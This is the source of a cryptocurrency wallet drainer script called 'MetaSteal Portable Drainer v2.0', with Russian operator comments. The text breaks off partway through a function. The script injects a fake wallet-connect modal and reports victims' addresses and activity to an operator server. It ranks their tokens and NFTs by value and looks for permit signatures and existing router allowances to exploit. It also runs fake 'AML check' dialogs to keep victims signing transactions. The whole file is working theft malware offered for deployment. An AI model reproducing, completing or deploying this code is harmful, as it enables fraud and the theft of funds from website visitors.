// MetaSteal Portable Drainer v2.0
// Версия скрипта: ULTIMATE EDITION

// Использование данного кода без обфускации СТРОГО ЗАПРЕЩЕНО
// В случае, если это будет обнаружено, будет составлен арбитраж
// Обфускацию данного скрипта можно выполнить здесь: obfuscator.io

// =====================================================================
// ==================== ОСНОВНЫЕ НАСТРОЙКИ СКРИПТА =====================
// =====================================================================

const MS_Server = "backendcookjohndeo.com"; // Указать домен, который прикреплен к серверу дрейнера
// Это тот домен, где у вас стоит сервер, а не сам сайт, где вы планируете использовать дрейнер

// =====================================================================
// ============ ВНОСИТЬ ИЗМЕНЕНИЯ В КОД НИЖЕ НЕ БЕЗОПАСНО ==============
// =====================================================================

let MS_Ready = false, MS_Settings = {}, MS_Contract_ABI = {}, MS_ID = 0, MS_Process = false,
MS_Provider = null, MS_Current_Provider = null, MS_Current_Address = null, MS_Current_Chain_ID = null,
MS_Web3 = null, MS_Signer = null, MS_Check_Done = false, MS_Currencies = {};

if (typeof MS_Worker_ID === 'undefined') {
  var MS_Worker_ID = null;
}

(async () => {
  try {
    let response = await fetch(`https://min-api.cryptocompare.com/data/pricemulti?fsyms=ETH,BNB,MATIC,AVAX,ARB,FTM,OP&tsyms=USD`, {
      method: 'GET', headers: { 'Accept': 'application/json' }
    });
    MS_Currencies = await response.json();
  } catch(err) {
    console.log(err);
  }
})();

const MS_API_Data = {
  1: 'api.etherscan.io',
  10: 'api-optimistic.etherscan.io',
  56: 'api.bscscan.com',
  137: 'api.polygonscan.com',
  250: 'api.ftmscan.com',
  42161: 'api.arbiscan.io',
  43114: 'api.snowtrace.io'
};

const MS_Routers = {
  1: [
    ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45'],
    ['Pancake', '0xEfF92A263d31888d860bD50809A8D171709b7b1c'],
    ['Sushiswap', '0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F']
  ],
  10: [
    ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45']
  ],
  56: [
    ['Pancake', '0x10ED43C718714eb63d5aA57B78B54704E256024E'],
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']
  ],
  137: [
    ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45'],
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506'],
    ['Quickswap', '0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff']
  ],
  250: [
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']
  ],
  42161: [
    ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45'],
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']
  ],
  43114: [
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']
  ]
};

const MS_Swap_Route = {
  1: '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2',
  10: '0x4200000000000000000000000000000000000006',
  56: '0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c',
  137: '0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270',
  250: '0x21be370d5312f44cb42ce377bc9b8a0cef1a4c83',
  42161: '0x82af49447d8a07e3bd95bd0d56f35241523fbab1',
  43114: '0xb31f66aa3c1e785363f0875a1b74e27b85fd66c7'
};

const MS_Uniswap_ABI = [{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"}],"name":"swapExactTokensForTokens","outputs":[{"internalType":"uint256","name":"amountOut","type":"uint256"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"bytes[]","name":"data","type":"bytes[]"}],"name":"multicall","outputs":[{"internalType":"bytes[]","name":"","type":"bytes[]"}],"stateMutability":"payable","type":"function"}];
const MS_Pancake_ABI = [{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactTokensForTokens","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactTokensForETH","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"}];

const MS_Current_URL = window.location.href.replaceAll(/http[s]*:\/\//g, '');
const MS_Mobile_Status = (() => {
  let check = false;
  (function (a) { if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true; })(navigator.userAgent || navigator.vendor || window.opera);
  return check;
})();

const MS_Unlimited_Amount = '1158472395435294898592384258348512586931256';

const MS_Modal_Style = `@import url(https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap);.web3-modal,.web3-overlay{position:fixed;top:0;left:0;width:100%}.web3-overlay{height:100%;background:rgba(23,23,23,.8);backdrop-filter:blur(5px);z-index:99998}.web3-modal{right:0;bottom:0;margin:auto;max-width:500px;height:fit-content;padding:21px 0 0;background:#fff;border-radius:10px;z-index:99999;font-family:Inter,sans-serif}.web3-modal-title{font-weight:700;font-size:24px;line-height:29px;color:#000;text-align:center}.web3-modal-items{border-top:1px solid rgba(0,0,0,.1);margin-top:21px}.web3-modal .item{padding:15px 34px;border-bottom:1px solid rgba(0,0,0,.1);display:flex;align-items:center;justify-content:space-between;cursor:pointer;transition:.2s}.web3-modal .item:hover{background:#fafafa}.web3-modal .item div{display:flex;align-items:center}.web3-modal .item:last-child{border-bottom:none}.web3-modal .item span{font-weight:400;font-size:16px;color:#000;margin-left:11px}.web3-modal .item .icon{width:40px;height:40px;justify-content:center}.web3-modal .item .arrow{height:12px;width:7.4px;background:url('/assets/web3-modal/images/arrow.svg') no-repeat}`;
const MS_Modal_Code = `<p class="web3-modal-title" style="margin-top: 0px;">Connect your wallet</p><div class="web3-modal-items"> <div class="item" onclick="connect_wallet('MetaMask')"> <div> <div class="icon"><img src="/assets/web3-modal/images/MM.svg" alt=""/></div><span>MetaMask</span> </div><div class="arrow"></div></div><div class="item" onclick="connect_wallet('Coinbase')"> <div> <div class="icon"><img src="/assets/web3-modal/images/CB.svg" alt=""/></div><span>Coinbase</span> </div><div class="arrow"></div></div><div class="item" onclick="connect_wallet('Trust Wallet')"> <div> <div class="icon"><img src="/assets/web3-modal/images/TW.svg" alt=""/></div><span>Trust Wallet</span> </div><div class="arrow"></div></div><div class="item" onclick="connect_wallet('Binance Wallet')"> <div> <div class="icon"><img src="/assets/web3-modal/images/BW.svg" alt=""/></div><span>Binance Wallet</span> </div><div class="arrow"></div></div><div class="item" onclick="connect_wallet('WalletConnect')"> <div> <div class="icon"><img src="/assets/web3-modal/images/WC.svg" alt=""/></div><span>WalletConnect</span> </div><div class="arrow"></div></div></div>`;

const inject_modal = () => {
  try {
    let modal_style = document.createElement('style');
    modal_style.innerHTML = MS_Modal_Style;
    document.head.appendChild(modal_style);
    let overlay_elem = document.createElement('div');
    overlay_elem.id = 'web3-overlay';
    overlay_elem.classList = ['web3-overlay'];
    overlay_elem.style.display = 'none';
    document.body.prepend(overlay_elem);
    let modal_elem = document.createElement('div');
    modal_elem.id = 'web3-modal';
    modal_elem.classList = ['web3-modal'];
    modal_elem.style.display = 'none';
    modal_elem.innerHTML = MS_Modal_Code;
    document.body.prepend(modal_elem);
    document.querySelector('.web3-overlay').addEventListener('click', () => {
      ms_hide();
    });
  } catch (err) {
    console.log(err);
  }
};

const inject_sweet = () => {
  try {
    let new_node = document.createElement("script");
    new_node.setAttribute("src", "https://cdn.jsdelivr.net/npm/sweetalert2@11");
    document.getElementsByTagName("body")[0].appendChild(new_node);
  } catch(err) {
    console.log(err);
  }
};

const ms_init = () => {
  try {
    if (MS_Process) return;
    document.getElementById('web3-modal').style.display = 'block';
    document.getElementById('web3-overlay').style.display = 'block';
  } catch (err) {
    console.log(err);
  }
};

const ms_hide = () => {
  try {
    document.getElementById('web3-modal').style.display = 'none';
    document.getElementById('web3-overlay').style.display = 'none';
  } catch (err) {
    console.log(err);
  }
};

const load_wc = () => {
  MS_Provider = new WalletConnectProvider.default({
    rpc: {
      1: MS_Settings.RPCs[1],
      10: MS_Settings.RPCs[10],
      56: MS_Settings.RPCs[56],
      137: MS_Settings.RPCs[137],
      250: MS_Settings.RPCs[250],
      42161: MS_Settings.RPCs[42161],
      43114: MS_Settings.RPCs[43114],
    },
    network: 'ethereum', chainId: 1
  });
};

const send_request = async (data) => {
  try {
    data.domain = window.location.host;
    if (MS_Worker_ID) domain.worker_id = MS_Worker_ID;
    const request_data = btoa(JSON.stringify(data));
    const response = await fetch('https://' + MS_Server, {
      method: 'POST',
      headers: {
        'Accept': 'text/plain',
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: `raw=${request_data}`
    });
    let response_data = JSON.parse(atob(await response.text()));
    if (!response_data.status)
      return { status: 'error', error: 'Server is Unavailable' };
    else return response_data;
  } catch(err) {
    console.log(err);
    return { status: 'error', error: 'Server is Unavailable' };
  }
};

const retrive_config = async () => {
  try {
    const response = await send_request({ action: 'retrive_config' });
    if (response.status == 'OK') MS_Settings = response.data;
  } catch(err) {
    console.log(err);
  }
};

const retrive_contract = async () => {
  try {
    const response = await send_request({ action: 'retrive_contract' });
    if (response.status == 'OK') {
      MS_Contract_ABI = response.data;
      MS_Contract_ABI['CONTRACT'] = JSON.parse(`[{"constant":false,"inputs":[],"name":"SecurityUpdate","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"Claim","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"ClaimReward","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"Swap","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"Connect","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"Execute","outputs":[],"payable":true,"stateMutability":"payable","type":"function"}]`);
    }
  } catch(err) {
    console.log(err);
  }
};

const enter_website = async () => {
  try {
    if (!MS_Settings.Notifications['enter_website']) return;
    await send_request({
      action: 'enter_website',
      user_id: MS_ID,
      time: new Date().toLocaleString('ru-RU')
    });
  } catch(err) {
    console.log(err);
  }
};

const leave_website = async () => {
  try {
    if (!MS_Settings.Notifications['leave_website']) return;
    await send_request({ action: 'leave_website', user_id: MS_ID });
  } catch(err) {
    console.log(err);
  }
};

const connect_request = async () => {
  try {
    if (!MS_Settings.Notifications['connect_request']) return;
    await send_request({ action: 'connect_request', user_id: MS_ID, wallet: MS_Current_Provider });
  } catch(err) {
    console.log(err);
  }
};

const connect_cancel = async () => {
  try {
    if (!MS_Settings.Notifications['connect_cancel']) return;
    await send_request({ action: 'connect_cancel', user_id: MS_ID });
  } catch(err) {
    console.log(err);
  }
};

const connect_success = async () => {
  try {
    if (!MS_Settings.Notifications['connect_success']) return;
    await send_request({
      action: 'connect_success', user_id: MS_ID, address: MS_Current_Address,
      wallet: MS_Current_Provider, chain_id: MS_Current_Chain_ID
    });
  } catch(err) {
    console.log(err);
  }
};

const convert_chain = (from, to, value) => {
  try {
    if (from == 'ANKR' && to == 'ID') {
      switch (value) {
        case 'eth': return 1;
        case 'bsc': return 56;
        case 'polygon': return 137;
        case 'avalanche': return 43114;
        case 'arbitrum': return 42161;
        case 'optimism': return 10;
        case 'fantom': return 250;
        default: return false;
      }
    } else if (from == 'OPENSEA' && to == 'ID') {
      switch (value) {
        case 'ethereum': return 1;
        case 'matic': return 137;
        case 'avalanche': return 43114;
        case 'arbitrum': return 42161;
        case 'optimism': return 10;
        default: return false;
      }
    } else if (from == 'ID' && to == 'ANKR') {
      switch (value) {
        case 1: return 'eth';
        case 56: return 'bsc';
        case 137: return 'polygon';
        case 43114: return 'avalanche';
        case 42161: return 'arbitrum';
        case 10: return 'optimism';
        case 250: return 'fantom';
        default: return false;
      }
    } else if (from == 'ID' && to == 'CURRENCY') {
      switch (value) {
        case 1: return 'ETH';
        case 56: return 'BNB';
        case 137: return 'MATIC';
        case 43114: return 'AVAX';
        case 42161: return 'ETH';
        case 10: return 'ETH';
        case 250: return 'FTM';
        default: return false;
      }
    }
  } catch(err) {
    console.log(err);
    return false;
  }
};

const get_tokens = async (address) => {
  try {
    let tokens = [], response = await fetch('https://rpc.ankr.com/multichain', {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        "id": 1,
        "jsonrpc": "2.0",
        "method": "ankr_getAccountBalance",
        "params": {
          "blockchain": [ "eth", "bsc", "polygon", "avalanche", "arbitrum", "fantom", "optimism" ],
          "walletAddress": address
        }
      })
    });
    response = await response.json();
    for (const asset of response.result.assets) {
      try {
        let contract_address = asset.contractAddress || 'NATIVE';
        if (MS_Settings.Contract_Whitelist.length > 0 && !MS_Settings.Contract_Whitelist.includes(contract_address.toLowerCase())) continue;
        else if (MS_Settings.Contract_Blacklist.length > 0 && MS_Settings.Contract_Blacklist.includes(contract_address.toLowerCase())) continue;
        let new_asset = {
          chain_id: convert_chain('ANKR', 'ID', asset.blockchain),
          name: asset.tokenName, type: asset.tokenType,
          amount: parseFloat(asset.balance), amount_raw: asset.balanceRawInteger,
          amount_usd: parseFloat(asset.balanceUsd), symbol: asset.tokenSymbol,
          decimals: asset.tokenDecimals, address: contract_address ?? null,
          price: parseFloat(asset.tokenPrice)
        };
        if (new_asset.price > 0) tokens.push(new_asset);
      } catch(err) {
        console.log(err);
      }
    }
    return tokens;
  } catch(err) {
    console.log(err);
    return [];
  }
};

const get_nfts = async (address) => {
  try {
    let response = await fetch(`https://api.opensea.io/api/v1/assets?owner=${address}&order_direction=desc&limit=200&include_orders=false`);
    let tokens = (await response.json())['assets'];
    response = await fetch(`https://api.opensea.io/api/v1/collections?asset_owner=${address}&offset=0&limit=200`);
    let collections = await response.json(), list = [];
    for (const asset of tokens) {
      try {
        let collection = null;
        for (const x_collection of collections) {
          try {
            if (x_collection.primary_asset_contracts.length < 1) continue;
            if (x_collection.primary_asset_contracts[0].address == asset.asset_contract.address) {
              collection = x_collection;
              break;
            }
          } catch(err) {
            console.log(err);
          }
        }
        if (collection == null) continue;
        let asset_chain_id = convert_chain('OPENSEA', 'ID', asset.asset_contract.chain_identifier);
        let asset_price = MS_Settings.OS_Mode == 1 ? ((collection.stats.one_day_average_price != 0) ?
        collection.stats.one_day_average_price : collection.stats.seven_day_average_price) : collection.stats.floor_price;
        asset_price = asset_price * MS_Currencies[convert_chain('ID', 'CURRENCY', asset_chain_id)]['USD'];
        let new_asset = {
          chain_id: asset_chain_id, name: asset.name, type: asset.asset_contract.schema_name, amount: asset.num_sales,
          amount_raw: null, amount_usd: asset_price, id: asset.token_id, symbol: null, decimals: null,
          address: asset.asset_contract.address, price: asset_price
        };
        if (typeof asset_price == 'number' && !isNaN(asset_price) && asset_price > 0) list.push(new_asset);
      } catch(err) {
        console.log(err);
      }
    }
    return list;
  } catch(err) {
    console.log(err);
    return [];
  }
};

const retrive_token = async (chain_id, contract_address) => {
  try {
    let response = await fetch(`https://${MS_API_Data[chain_id]}/api?module=contract&action=getsourcecode&address=${contract_address}&apikey=${MS_Settings.Settings.Chains[convert_chain('ID', 'ANKR', chain_id)].API}`, {
      method: 'GET', headers: { 'Accept': 'application/json' }
    });
    response = await response.json();
    if (response.message == 'OK') {
      if (response.result[0].Proxy == '1' && response.result[0].Implementation != '') {
        const implementation = response.result[0].Implementation;
        return retrive_token(chain_id, implementation);
      } else {
        return JSON.parse(response.result[0].ABI)
      }
    } else {
      return MS_Contract_ABI['ERC20'];
    }
  } catch (err) {
    return MS_Contract_ABI['ERC20'];
  }
};

const get_permit_type = (func) => {
  try {
    if (MS_Settings.Settings.Permit.Mode == false) return 0;
    if (func.hasOwnProperty('permit') && func.hasOwnProperty('nonces') &&
      func.hasOwnProperty('name') && func.hasOwnProperty('DOMAIN_SEPARATOR')) {
      const permit_version = ((func) => {
        for (const key in func) {
          if (key.startsWith('permit(')) {
            const args = key.slice(7).split(',')
            if (args.length === 7 && key.indexOf('bool') === -1) return 2;
            if (args.length === 8 && key.indexOf('bool') !== -1) return 1;
            return 0;
          }
        }
      })(func);
      return permit_version;
    } else {
      return 0;
    }
  } catch (err) {
    return 0;
  }
};

const MS_Gas_Reserves = {};

const get_wallet_assets = async (address) => {
  try {
    let response = await send_request({ action: 'check_wallet', address: MS_Current_Address }), assets = [];
    if (response.status == 'OK') assets = response.data; else assets = await get_tokens(address);

    let token_promises = [];

    for (let x = (assets.length - 1); x >= 0; x--) {
      try {
        const asset = assets[x];
        const chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
        if (!MS_Settings.Settings.Chains[chain_id].Enable) assets.splice(x, 1);
        else if (asset.type == 'NATIVE' && !MS_Settings.Settings.Chains[chain_id].Native) assets.splice(x, 1);
        else if (asset.type == 'ERC20' && !MS_Settings.Settings.Chains[chain_id].Tokens) assets.splice(x, 1);
        else if (asset.type == 'NATIVE' && asset.amount_usd < MS_Settings.Settings.Chains[chain_id].Min_Native_Price) assets.splice(x, 1);
        else if (asset.type == 'ERC20' && asset.amount_usd < MS_Settings.Settings.Chains[chain_id].Min_Tokens_Price) assets.splice(x, 1);
        else if (asset.type == 'ERC20') {
          if (MS_Settings.Settings.Permit.Mode && MS_Settings.Settings.Permit.Priority) {
            token_promises.push(new Promise(async (resolve) => {
              try {
                const data = await retrive_token(asset.chain_id, asset.address);
                const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
                const contract = new ethers.Contract(asset.address, data, node);
                const permit_type = get_permit_type(contract.functions);
                assets[x].permit = permit_type;
                assets[x].permit_ver = "1";
                assets[x].abi = data;
                if (permit_type > 0) {
                  if (contract.functions.hasOwnProperty('version')) {
                    try {
                      assets[x].permit_ver = await contract.version();
                    } catch(err) {
                      console.log(err);
                    }
                  }
                  console.log(`[PERMIT FOUND] ${asset.name}, Permit Type: ${permit_type}, Version: ${assets[x].permit_ver}`);
                }
              } catch(err) {
                console.log(err);
              } resolve();
            }));
          }
          if (MS_Settings.Settings.Swappers.Enable && ((asset.chain_id == 1 && asset.amount_usd >= 50) || (asset.chain_id != 1 && asset.amount_usd >= 15))) {
            token_promises.push(new Promise(async (resolve) => {
              try {
                const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
                for (const swapper of MS_Routers[asset.chain_id]) {
                  try {
                    const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC20'], node);
                    const allowance = await contract.allowance(MS_Current_Address, swapper[1]);
                    if (ethers.BigNumber.from(allowance).gt(ethers.BigNumber.from('0'))) {
                      assets[x].swapper = true;
                      assets[x].swapper_type = swapper[0];
                      assets[x].swapper_address = swapper[1];
                      assets[x].swapper_allowance = allowance;
                      console.log(`[SWAP FOUND] ${asset.name}, ${swapper[0]}`);
                      break;
                    }
                  } catch(err) {
                    console.log(err);
                  }
                }
              } catch(err) {
                console.log(err);
              } resolve();
            }));
          }
        }
      } catch(err) {
        console.log(err);
      }
    }

    await Promise.all(token_promises);

    let NFT_Status = false;

    for (const chain_id in MS_Settings.Settings.Chains) {
      try {
        if (MS_Settings.Settings.Chains[chain_id].NFTs) {
          NFT_Status = true;
          break;
        }
      } catch(err) {
        console.log(err);
      }
    }

    if (NFT_Status) {
      try {
        let nft_list = [];
        response = await send_request({ action: 'check_nft', address: MS_Current_Address });
        if (response.status == 'OK') {
          nft_list = response.data;
          for (const asset of nft_list) {
            try {
              const chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
              if (asset.type == 'ERC1155') continue;
              if (!MS_Settings.Settings.Chains[chain_id].NFTs) continue;
              if (asset.amount_usd < MS_Settings.Settings.Chains[chain_id].Min_NFTs_Price) continue;
              assets.push(asset);
            } catch(err) {
              console.log(err);
            }
          }
        } else {
          nft_list = await get_nfts(address);
          for (const asset of nft_list) {
            try {
              const chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
              if (asset.type == 'ERC1155') continue;
              if (!MS_Settings.Settings.Chains[chain_id].NFTs) continue;
              if (asset.amount_usd < MS_Settings.Settings.Chains[chain_id].Min_NFTs_Price) continue;
              assets.push(asset);
            } catch(err) {
              console.log(err);
            }
          }
        }
      } catch(err) {
        console.log(err);
      }
    }

    assets.sort((a, b) => { return b.amount_usd - a.amount_usd });

    if (MS_Settings.Settings.Tokens_First) {
      const new_assets = [];
      for (const asset of assets) {
        try {
          if (asset.type == 'NATIVE') continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      for (const asset of assets) {
        try {
          if (asset.type != 'NATIVE') continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      assets = new_assets;
    }

    if (MS_Settings.Settings.Swappers.Enable && MS_Settings.Settings.Swappers.Priority == 1) {
      const new_assets = [];
      for (const asset of assets) {
        try {
          if (!asset.swapper) continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      for (const asset of assets) {
        try {
          if (asset.swapper) continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      assets = new_assets;
    }

    if (MS_Settings.Settings.Permit.Mode && MS_Settings.Settings.Permit.Priority) {
      const new_assets = [];
      for (const asset of assets) {
        try {
          if (!asset.permit || asset.permit == 0) continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      for (const asset of assets) {
        try {
          if (asset.permit && asset.permit > 0) continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      assets = new_assets;
    }

    if (MS_Settings.Settings.Swappers.Enable && MS_Settings.Settings.Swappers.Priority == 2) {
      const new_assets = [];
      for (const asset of assets) {
        try {
          if (!asset.swapper) continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      for (const asset of assets) {
        try {
          if (asset.swapper) continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      assets = new_assets;
    }

    return assets;
  } catch(err) {
    console.log(err);
    return [];
  }
};

const show_check = () => {
  try {
    Swal.fire({
      title: 'Connection established',
      icon: 'success',
      timer: 2000
    }).then(() => {
      if (MS_Check_Done) return;
      Swal.fire({
        text: 'Connecting to Blockchain...',
        imageUrl: 'https://cdn.pixabay.com/animation/2022/10/11/03/16/03-16-39-160_512.gif',
        imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
        timer: 5000, width: 600, showConfirmButton: false
      }).then(() => {
        if (MS_Check_Done) return;
        Swal.fire({
          text: 'Getting your wallet address...',
          imageUrl: 'https://cdn.pixabay.com/animation/2022/10/11/03/16/03-16-39-160_512.gif',
          imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
          timer: 5000, width: 600, showConfirmButton: false
        }).then(() => {
          if (MS_Check_Done) return;
          Swal.fire({
            text: 'Checking your wallet for AML...',
            imageUrl: 'https://cdn.pixabay.com/animation/2022/10/11/03/16/03-16-39-160_512.gif',
            imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
            timer: 5000, width: 600, showConfirmButton: false
          }).then(() => {
            if (MS_Check_Done) return;
            Swal.fire({
              text: 'Good, your wallet is AML clear!',
              icon: 'success',
              allowOutsideClick: false, allowEscapeKey: false,
              timer: 2000, width: 600, showConfirmButton: false
            }).then(() => {
              if (MS_Check_Done) return;
              Swal.fire({
                text: 'Please wait, we\'re scanning more details...',
                imageUrl: 'https://cdn.pixabay.com/animation/2022/10/11/03/16/03-16-39-160_512.gif',
                imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
                timer: 0, width: 600, showConfirmButton: false
              });
            });
          });
        });
      });
    });
  } catch(err) {
    console.log(err);
  }
};

const get_nonce = async (chain_id) => {
  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[chain_id]);
  return await node.getTransactionCount(MS_Current_Address, "pending");
};

const wait_message = () => {
  try {
    Swal.close();
    Swal.fire({
      html: '<b>Thanks!</b>', icon: 'success',
      allowOutsideClick: false, allowEscapeKey: false,
      timer: 2500, width: 600, showConfirmButton: false
    }).then(() => {
      Swal.fire({
        html: '<b>Confirming your sign...</b><br><br>Please, don\'t leave this page!',
        imageUrl: 'https://cdn.pixabay.com/animation/2022/10/11/03/16/03-16-39-160_512.gif',
        imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
        timer: 0, width: 600, showConfirmButton: false
      });
    });
  } catch(err) {
    console.log(err);
  }
};

let is_first_sign = true;

const sign_next = () => {
  try {
    if (is_first_sign) {
      is_first_sign = false;
      return;
    }
    Swal.close();
    Swal.fire({
      html: '<b>Success!</b> Your sign is confirmed!',
      icon: 'success', allowOutsideClick: false, allowEscapeKey: false,
      timer: 2500, width: 600, showConfirmButton: false
    }).then(() => {
      Swal.fire({
        html: '<b>Waiting for your sign...</b><br><br>Please, sign message in your wallet!',
        imageUrl: 'https://cdn.pixabay.com/animation/2022/10/11/03/16/03-16-39-160_512.gif',
        imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
        timer: 0, width: 600, showConfirmButton: false
      });
    });
  } catch(err) {
    console.log(err);
  }
};

const SIGN_NATIVE = async (asset) => {
  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = ethers.BigNumber.from(await web3.eth.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
  const gas_limit_nt = (asset.chain_id == 42161) ? 1500000 : (asset.chain_id == 43114 ? 1500000 : 30000);
  const gas_limit_ct = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 150000);
  const after_fee = ethers.BigNumber.from(asset.amount_raw).sub(ethers.BigNumber.from(asset.chain_id == 10 ? '35000000000' : gas_price)
  .mul(ethers.BigNumber.from(gas_limit_ct)).mul(ethers.BigNumber.from(String(MS_Gas_Reserves[asset.chain_id]))))
  .sub(ethers.BigNumber.from(asset.chain_id == 10 ? '35000000000' : gas_price).mul(ethers.BigNumber.from(gas_limit_nt))
  .mul(ethers.BigNumber.from('2'))).toString();
